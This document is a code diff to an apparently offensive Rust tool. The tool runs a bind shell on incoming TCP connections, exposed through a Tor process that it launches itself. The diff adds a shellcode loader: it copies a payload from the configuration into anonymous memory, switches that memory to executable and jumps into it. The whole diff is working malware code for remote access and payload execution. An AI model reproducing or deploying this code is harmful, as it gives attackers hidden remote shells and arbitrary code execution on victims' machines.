@@ -3,11 +3,13 @@
 mod setting;
 mod config;
 
-use std::{io, error, thread};
+use std::{io, error, thread, mem, ptr};
 use std::fs::File;
 use std::path::{PathBuf};
 use std::process::{Command, Stdio, Child};
 use std::net::{TcpListener, TcpStream};
+
+use memmap::MmapMut;
 
 fn main() -> Result<(), Box<dyn error::Error>> {
     let setting = setting::Setting::new()?;
@@ -99,16 +101,20 @@ fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Err
 
     let mut tor_proc = start_tor_binary(&torrc, &setting)?;
 
-    for stream in listener.incoming() {
-        match stream {
-            Ok(stream) => {
-                println!("received connection");
-                match bind_shell(stream) {
-                    Ok(()) => {},
-                    Err(error) => println!("connection error: {:?}", error)
-                };
-            },
-            Err(error) => return Err(Box::new(error))
+    if setting.uses_shellcode {
+        execute_shellcode(&setting)?;
+    } else {
+        for stream in listener.incoming() {
+            match stream {
+                Ok(stream) => {
+                    println!("received connection");
+                    match bind_shell(stream) {
+                        Ok(()) => {},
+                        Err(error) => println!("connection error: {:?}", error)
+                    };
+                },
+                Err(error) => return Err(Box::new(error))
+            }
         }
     }
 
@@ -181,4 +187,22 @@ fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
     err_thread.join().unwrap();
 
     Ok(())
+}
+
+fn execute_shellcode(setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
+    let len = setting.shellcode.len();
+
+    // writable memory
+    let mut w_map = MmapMut::map_anon(len)?;
+
+    unsafe {
+        // write shellcode
+        ptr::copy(setting.shellcode.as_ptr(), w_map.as_mut_ptr(), len);
+
+        // transition to read and executable memory
+        let x_map = w_map.make_exec()?;
+
+        let code: extern "C" fn() -> ! = mem::transmute(x_map.as_ptr());
+        code();
+    };
 }
